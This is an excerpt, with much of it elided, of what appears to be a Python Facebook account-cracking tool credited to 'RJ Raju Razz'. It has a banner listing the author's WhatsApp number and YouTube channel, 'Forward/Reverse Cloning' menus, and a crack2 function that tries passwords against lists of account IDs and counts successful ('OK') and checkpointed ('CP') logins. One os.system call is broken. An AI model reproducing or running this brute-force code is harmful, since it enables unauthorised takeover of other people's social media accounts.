...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1m𝙍𝙅 Raju Razz
\x1b[93;1m WhatsApp       \x1b[92;1m=>      \x1b[93;1m+919954282827
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mTechnical Raju Ji
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/@Technical_Raju_Ji")
		exit()
	else:
		os.system("https://youtube.com/@Technical_Raju_Ji")
		exit()
...
def setting():
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[01] Forward Cloning """%(h))
	print("""%s \33[1;33m[02] Reverse Cloning """%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [RJ Raju Razz] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [RJ Raju Razz-CP] %s|%s        '%(b,idf,pw))
